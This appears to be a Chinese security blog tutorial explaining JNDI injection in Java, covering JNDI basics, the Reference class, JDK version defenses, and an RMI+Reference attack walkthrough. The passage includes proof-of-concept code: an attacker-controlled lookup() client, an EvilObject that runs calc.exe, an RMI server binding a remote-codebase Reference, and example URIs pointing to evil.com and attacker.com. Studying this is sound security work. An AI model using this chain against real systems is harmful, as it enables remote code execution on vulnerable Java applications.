<li>基础&amp;Tricks</li>
<li>Kali</li>
<li>Metasploit</li>
<li>内网渗透</li>
<li>提权<ul>
<li><a href="/2019/01/01/关于本地提权的学习笔记（一）：Administrator提权到System">Administrator提权到System</a></li>
<li><a href="/2019/01/01/关于本地提权的学习笔记（二）：注入进程和利用漏洞提权">注入进程和利用漏洞提权</a></li>
</ul>
</li>
<li>免杀</li>
<li>工具</li>
</ul>
</li>
<li><strong>OS</strong><ul>
<li>Windows<ul>
<li><a href="/2019/01/01/将Python脚本转换为exe">将Python脚本转换为exe</a></li>
<li><a href="/2019/01/01/几个查看用户信息的Windows程序">几个查看用户信息的Windows程序</a></li>
</ul>
</li>
<li>Linux</li>
</ul>
</li>
</ul>

  </div>
</div>
</div>

<header class="post-header text-center">
	<h1 class="title">
		浅析JNDI注入
	</h1>
	<span class="read">
		阅读量 <span id="busuanzi_value_page_pv"></span>
	</span>
</header><br>

<div class="book-post">
  <h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><h3 id="何为JNDI"><a href="#何为JNDI" class="headerlink" title="何为JNDI"></a>何为JNDI</h3><p>JNDI全称为 Java Naming and DirectoryInterface（Java命名和目录接口），是一组应用程序接口，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。</p>
<p>JNDI支持的服务主要有：DNS、LDAP、CORBA、RMI等。</p>
<p>简单点说，JNDI就是一组API接口。每一个对象都有一组唯一的键值绑定，将名字和对象绑定，可以通过名字检索指定的对象，而该对象可能存储在RMI、LDAP、CORBA等等。</p>
<p>如图：</p>
<p><img src="/2019/09/15/浅析JNDI注入/1.png" alt=""></p>
<h4 id="Java-Naming"><a href="#Java-Naming" class="headerlink" title="Java Naming"></a>Java Naming</h4><p>命名服务是一种键值对的绑定，使应用程序可以通过键检索值。</p>
<h4 id="Java-Directory"><a href="#Java-Directory" class="headerlink" title="Java Directory"></a>Java Directory</h4><p>目录服务是命名服务的自然扩展。这两者之间的区别在于目录服务中对象可以有属性，而命名服务中对象没有属性。因此，在目录服务中可以根据属性搜索对象。</p>
<p>JNDI允许你访问文件系统中的文件，定位远程RMI注册的对象，访问如LDAP这样的目录服务，定位网络上的EJB组件。</p>
<h4 id="ObjectFactory"><a href="#ObjectFactory" class="headerlink" title="ObjectFactory"></a>ObjectFactory</h4><p>Object Factory用于将Naming Service（如RMI/LDAP）中存储的数据转换为Java中可表达的数据，如Java中的对象或Java中的基本数据类型。每一个Service Provider可能配有多个Object Factory。</p>
<p>JNDI注入的问题就是处在可远程下载自定义的ObjectFactory类上。</p>
<h3 id="JNDI的代码示例"><a href="#JNDI的代码示例" class="headerlink" title="JNDI的代码示例"></a>JNDI的代码示例</h3><p>在JNDI中提供了绑定和查找的方法：</p>
<ul>
<li>bind：将名称绑定到对象中；</li>
<li>lookup：通过名字检索执行的对象；</li>
</ul>
<p>下面是基本用法Demo，以RMI服务为例。</p>
<p>先定义一个Person类：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Remote</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPassword</span><span class="params">(String password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"name:"</span>+name+<span class="string">" password:"</span>+password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Server.java，其实是将服务端和客户端的代码写在一起了，分为两个部分。第一部分是initPerson()函数即服务端，其通过JNDI实现RMI服务，并通过JNDI的bind()函数将实例化的Person对象绑定到RMI服务中；第二部分是findPerson()函数即客户端，其通过JNDI的lookup方法来检索person对象并输出出来：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">initPerson</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常</span></span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">6666</span>);</span><br><span class="line">        System.setProperty(Context.INITIAL_CONTEXT_FACTORY, <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">        System.setProperty(Context.PROVIDER_URL, <span class="string">"rmi://localhost:6666"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//初始化</span></span><br><span class="line">        InitialContext ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例化person对象</span></span><br><span class="line">        Person p = <span class="keyword">new</span> Person();</span><br><span class="line">        p.setName(<span class="string">"mi1k7ea"</span>);</span><br><span class="line">        p.setPassword(<span class="string">"Niubility!"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//person对象绑定到JNDI服务中，JNDI的名字叫做：person。</span></span><br><span class="line">        ctx.bind(<span class="string">"person"</span>, p);</span><br><span class="line">        ctx.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">findPerson</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//因为前面已经将JNDI工厂和JNDI的url和端口已经添加到System对象中，这里就不用在绑定了</span></span><br><span class="line">        InitialContext ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过lookup查找person对象</span></span><br><span class="line">        Person person = (Person) ctx.lookup(<span class="string">"person"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//打印出这个对象</span></span><br><span class="line">        System.out.println(person.toString());</span><br><span class="line">        ctx.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        initPerson();</span><br><span class="line">        findPerson();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行Server的程序，findPerson()函数会成功从启动的JNDI服务中找到指定的对象并输出出来：</p>
<p><img src="/2019/09/15/浅析JNDI注入/2.png" alt=""></p>
<p><strong>一个题外话</strong></p>
<p>我们可以简单比较一下纯RMI写法和使用JNDI检索的写法，在纯RMI写法中的两种典型写法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> remote.IRemoteMath;</span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//服务端</span></span><br><span class="line">    IRemoteMath remoteMath = <span class="keyword">new</span> RemoteMath();</span><br><span class="line">    LocateRegistry.createRegistry(<span class="number">1099</span>);    </span><br><span class="line">    Registry registry = LocateRegistry.getRegistry();</span><br><span class="line">    registry.bind(<span class="string">"Compute"</span>, remoteMath);</span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//客户端</span></span><br><span class="line">    Registry registry = LocateRegistry.getRegistry(<span class="string">"localhost"</span>);        </span><br><span class="line">    IRemoteMath remoteMath = (IRemoteMath)registry.lookup(<span class="string">"Compute"</span>);</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	<span class="comment">//服务端</span></span><br><span class="line">    PersonService personService=<span class="keyword">new</span> PersonServiceImpl();</span><br><span class="line">    LocateRegistry.createRegistry(<span class="number">6600</span>);</span><br><span class="line">    Naming.rebind(<span class="string">"rmi://127.0.0.1:6600/PersonService"</span>, personService);</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	<span class="comment">//客户端</span></span><br><span class="line">	PersonService personService=(PersonService) Naming.lookup(<span class="string">"rmi://127.0.0.1:6600/PersonService"</span>);</span><br></pre></td></tr></table></figure>
<p>而JNDI中相关代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line">	<span class="comment">//服务端</span></span><br><span class="line">	LocateRegistry.createRegistry(<span class="number">6666</span>);</span><br><span class="line">    System.setProperty(Context.INITIAL_CONTEXT_FACTORY, <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">    System.setProperty(Context.PROVIDER_URL, <span class="string">"rmi://localhost:6666"</span>);</span><br><span class="line">    InitialContext ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">	...</span><br><span class="line">    ctx.bind(<span class="string">"person"</span>, p);</span><br><span class="line">    ctx.close();</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	<span class="comment">//客户端</span></span><br><span class="line">    InitialContext ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">    Person person = (Person) ctx.lookup(<span class="string">"person"</span>);</span><br><span class="line">	ctx.close();</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">	<span class="comment">//服务端</span></span><br><span class="line">    Properties env = <span class="keyword">new</span> Properties();</span><br><span class="line">    env.put(Context.INITIAL_CONTEXT_FACTORY,</span><br><span class="line">            <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">    env.put(Context.PROVIDER_URL,</span><br><span class="line">            <span class="string">"rmi://localhost:1099"</span>);</span><br><span class="line">    Context ctx = <span class="keyword">new</span> InitialContext(env);</span><br></pre></td></tr></table></figure>
<p>相比之下：</p>
<ul>
<li>服务端：纯RMI实现中是调用java.rmi包内的bind()或rebind()方法来直接绑定RMI注册表端口的，而JNDI创建的RMI服务中多的部分就是需要设置INITIAL_CONTEXT_FACTORY和PROVIDER_URL来指定InitialContext的初始化Factory和Provider的URL地址，换句话说就是初始化配置JNDI设置时需要预先指定其上下文环境如指定为RMI服务，最后再调用javax.naming.InitialContext.bind()来将指定对象绑定到RMI注册表中；</li>
<li>客户端：纯RMI实现中是调用java.rmi包内的lookup()方法来检索绑定在RMI注册表中的对象，而JNDI实现的RMI客户端查询是调用javax.naming.InitialContext.lookup()方法来检索的；</li>
</ul>
<p>简单地说，纯RMI实现的方式主要是调用java.rmi这个包来实现绑定和检索的，而JNDI实现的RMI服务则是调用javax.naming这个包即应用Java Naming来实现的。</p>
<h3 id="Reference类"><a href="#Reference类" class="headerlink" title="Reference类"></a>Reference类</h3><p>Reference类表示对存在于命名/目录系统以外的对象的引用。</p>
<p>Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI、LDAP等。</p>
<p>在使用Reference时，我们可以直接将对象写在构造方法中，当被调用时，对象的方法就会被触发。</p>
<p>几个比较关键的属性：</p>
<ul>
<li>className：远程加载时所使用的类名；</li>
<li>classFactory：加载的class中需要实例化类的名称；</li>
<li>classFactoryLocation：远程加载类的地址，提供classes数据的地址可以是file/ftp/http等协议；</li>
</ul>
<h3 id="远程代码和安全管理器"><a href="#远程代码和安全管理器" class="headerlink" title="远程代码和安全管理器"></a>远程代码和安全管理器</h3><p>这部分引用自：<a href="https://blog.csdn.net/u011721501/article/details/52316225" target="_blank" rel="noopener">https://blog.csdn.net/u011721501/article/details/52316225</a></p>
<h4 id="Java中的安全管理器"><a href="#Java中的安全管理器" class="headerlink" title="Java中的安全管理器"></a>Java中的安全管理器</h4><blockquote>
<p>Java中的对象分为本地对象和远程对象，本地对象是默认为可信任的，但是远程对象是不受信任的。比如，当我们的系统从远程服务器加载一个对象，为了安全起见，JVM就要限制该对象的能力，比如禁止该对象访问我们本地的文件系统等，这些在现有的JVM中是依赖安全管理器（SecurityManager）来实现的。</p>
<p><img src="/2019/09/15/浅析JNDI注入/3.png" alt=""></p>
<p>JVM中采用的最新模型见上图，引入了“域”的概念，在不同的域中执行不同的权限。JVM会把所有代码加载到不同的系统域和应用域，系统域专门负责与关键资源进行交互，而应用域则通过系统域的部分代理来对各种需要的资源进行访问，存在于不同域的class文件就具有了当前域的全部权限。</p>
<p>关于安全管理机制，可以详细阅读：</p>
<p><a href="http://www.ibm.com/developerworks/cn/java/j-lo-javasecurity/" target="_blank" rel="noopener">http://www.ibm.com/developerworks/cn/java/j-lo-javasecurity/</a></p>
</blockquote>
<h4 id="JNDI的安全管理器"><a href="#JNDI的安全管理器" class="headerlink" title="JNDI的安全管理器"></a>JNDI的安全管理器</h4><p>这部分在后面绕过高版本JDK限制中也会具体讲到。</p>
<blockquote>
<p>对于加载远程对象，JDNI有两种不同的安全控制方式，对于Naming Manager来说，相对的安全管理器的规则比较宽泛，但是对JNDI SPI层会按照下面表格中的规则进行控制：</p>
<p><img src="/2019/09/15/浅析JNDI注入/4.png" alt=""></p>
<p>针对以上特性，黑客可能会找到一些特殊场景，利用两者的差异来执行恶意代码。</p>
</blockquote>
<h3 id="JNDI协议动态转换"><a href="#JNDI协议动态转换" class="headerlink" title="JNDI协议动态转换"></a>JNDI协议动态转换</h3><p>举前面的例子，JNDI实现的RMI服务中，可以在初始化配置JNDI设置时预先指定其上下文环境（RMI、LDAP、CORBA等），这里列出前面的两种写法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    Properties env = <span class="keyword">new</span> Properties();</span><br><span class="line">    env.put(Context.INITIAL_CONTEXT_FACTORY,</span><br><span class="line">            <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">    env.put(Context.PROVIDER_URL,</span><br><span class="line">            <span class="string">"rmi://localhost:1099"</span>);</span><br><span class="line">    Context ctx = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">	LocateRegistry.createRegistry(<span class="number">6666</span>);</span><br><span class="line">    System.setProperty(Context.INITIAL_CONTEXT_FACTORY, <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">    System.setProperty(Context.PROVIDER_URL, <span class="string">"rmi://localhost:6666"</span>);</span><br><span class="line">    InitialContext ctx = <span class="keyword">new</span> InitialContext();</span><br></pre></td></tr></table></figure>
<p>但在调用lookup()或者search()时，可以使用带URI动态的转换上下文环境，例如上面已经设置了当前上下文会访问RMI服务，那么可以直接使用LDAP的URI格式去转换上下文环境访问LDAP服务上的绑定对象而非原本的RMI服务：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctx.lookup(<span class="string">"ldap://attacker.com:12345/ou=foo,dc=foobar,dc=com"</span>);</span><br></pre></td></tr></table></figure>
<p>其原理可以跟踪代码找到：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(String name)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> getURLOrDefaultInitCtx(name).lookup(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>再跟进去就知道了：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Context <span class="title">getURLOrDefaultInitCtx</span><span class="params">(Name paramName)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (NamingManager.hasInitialContextFactoryBuilder()) &#123;</span><br><span class="line">        <span class="keyword">return</span> getDefaultInitCtx(); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (paramName.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        String str1 = paramName.get(<span class="number">0</span>);</span><br><span class="line">        String str2 = getURLScheme(str1);  <span class="comment">// 尝试解析 URI 中的协议</span></span><br><span class="line">        <span class="keyword">if</span> (str2 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果存在 Schema 协议，则尝试获取其对应的上下文环境</span></span><br><span class="line">            Context localContext = NamingManager.getURLContext(str2, <span class="keyword">this</span>.myProps);</span><br><span class="line">            <span class="keyword">if</span> (localContext != <span class="keyword">null</span>) &#123; </span><br><span class="line">                <span class="keyword">return</span> localContext;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> getDefaultInitCtx();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x02-JNDI注入"><a href="#0x02-JNDI注入" class="headerlink" title="0x02 JNDI注入"></a>0x02 JNDI注入</h2><h3 id="前提条件-amp-JDK防御"><a href="#前提条件-amp-JDK防御" class="headerlink" title="前提条件&amp;JDK防御"></a>前提条件&amp;JDK防御</h3><p>要想成功利用JNDI注入漏洞，重要的前提就是当前Java环境的JDK版本，而JNDI注入中不同的攻击向量和利用方式所被限制的版本号都有点不一样。</p>
<p>这里将所有不同版本JDK的防御都列出来：</p>
<ul>
<li>JDK 6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</li>
<li>JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。</li>
<li>JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。</li>
</ul>
<p>因此，我们在进行JNDI注入之前，必须知道当前环境JDK版本这一前提条件，只有JDK版本在可利用的范围内才满足我们进行JNDI注入的前提条件。</p>
<h3 id="RMI攻击向量"><a href="#RMI攻击向量" class="headerlink" title="RMI攻击向量"></a>RMI攻击向量</h3><h4 id="RMI-Reference利用技巧"><a href="#RMI-Reference利用技巧" class="headerlink" title="RMI+Reference利用技巧"></a>RMI+Reference利用技巧</h4><p>JNDI提供了一个Reference类来表示某个对象的引用，这个类中包含被引用对象的类信息和地址。</p>
<p>因为在JNDI中，对象传递要么是序列化方式存储（对象的拷贝，对应按值传递），要么是按照引用（对象的引用，对应按引用传递）来存储，当序列化不好用的时候，我们可以使用Reference将对象存储在JNDI系统中。</p>
<p>那么这个JNDI利用技巧是啥呢？——<strong>就是将恶意的Reference类绑定在RMI注册表中，其中恶意引用指向远程恶意的class文件，当用户在JNDI客户端的lookup()函数参数外部可控或Reference类构造方法的classFactoryLocation参数外部可控时，会使用户的JNDI客户端访问RMI注册表中绑定的恶意Reference类，从而加载远程服务器上的恶意class文件在客户端本地执行，最终实现JNDI注入攻击导致远程代码执行</strong>。</p>
<p>我们看个示例，以lookup()函数参数外部可控为例，攻击原理如图：</p>
<p><img src="/2019/09/15/浅析JNDI注入/6.png" alt=""></p>
<ol>
<li>攻击者通过可控的 URI 参数触发动态环境转换，例如这里 URI 为 <code>rmi://evil.com:1099/refObj</code>；</li>
<li>原先配置好的上下文环境 <code>rmi://localhost:1099</code> 会因为动态环境转换而被指向 <code>rmi://evil.com:1099/</code>；</li>
<li>应用去 <code>rmi://evil.com:1099</code> 请求绑定对象 <code>refObj</code>，攻击者事先准备好的 RMI 服务会返回与名称 <code>refObj</code>想绑定的 ReferenceWrapper 对象（<code>Reference(&quot;EvilObject&quot;, &quot;EvilObject&quot;, &quot;http://evil-cb.com/&quot;)</code>）；</li>
<li>应用获取到 <code>ReferenceWrapper</code> 对象开始从本地 <code>CLASSPATH</code> 中搜索 <code>EvilObject</code> 类，如果不存在则会从 <code>http://evil-cb.com/</code> 上去尝试获取 <code>EvilObject.class</code>，即动态的去获取 <code>http://evil-cb.com/EvilObject.class</code>；</li>
<li>攻击者事先准备好的服务返回编译好的包含恶意代码的 <code>EvilObject.class</code>；</li>
<li>应用开始调用 <code>EvilObject</code> 类的构造函数，因攻击者事先定义在构造函数，被包含在里面的恶意代码被执行；</li>
</ol>
<p>代码如下，当然需要注意JDK版本的影响，我本地JDK版本为1.8.0_73。</p>
<p>JNDIClient.java，lookup()函数参数外部可控：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(args.length &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">"Usage: java JNDIClient &lt;uri&gt;"</span>);</span><br><span class="line">            System.exit(-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        String uri = args[<span class="number">0</span>];</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        System.out.println(<span class="string">"Using lookup() to fetch object with "</span> + uri);</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>EvilObject.java，目的是弹计算器：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilObject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EvilObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Runtime rt = Runtime.getRuntime();</span><br><span class="line">        String[] commands = &#123;<span class="string">"cmd"</span>, <span class="string">"/C"</span>, <span class="string">"calc.exe"</span>&#125;;</span><br><span class="line">        Process pc = rt.exec(commands);</span><br><span class="line">        pc.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>RMIService.java，对象实例要能成功绑定在RMI服务上，必须直接或间接的实现 Remote 接口，这里 ReferenceWrapper就继承于 UnicastRemoteObject 类并实现了Remote接口：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference refObj = <span class="keyword">new</span> Reference(<span class="string">"EvilObject"</span>, <span class="string">"EvilObject"</span>, <span class="string">"http://127.0.0.1:8080/"</span>);</span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(refObj);</span><br><span class="line">        System.out.println(<span class="string">"Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/refObj'"</span>);</span><br><span class="line">        registry.bind(<span class="string">"refObj"</span>, refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
